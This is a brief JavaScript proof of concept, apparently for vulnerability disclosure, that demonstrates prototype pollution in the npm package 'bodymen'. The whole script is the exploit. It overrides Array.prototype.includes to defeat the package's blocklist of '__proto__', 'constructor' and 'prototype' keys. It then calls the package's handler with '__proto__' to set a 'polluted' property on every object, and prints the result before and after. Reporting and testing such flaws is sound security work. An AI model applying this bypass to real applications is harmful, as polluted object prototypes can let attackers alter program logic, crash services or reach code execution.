Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const x = require('bodymen');
console.log({}.polluted);
x.handler('__proto__', 'polluted', 'yes');
console.log({}.polluted);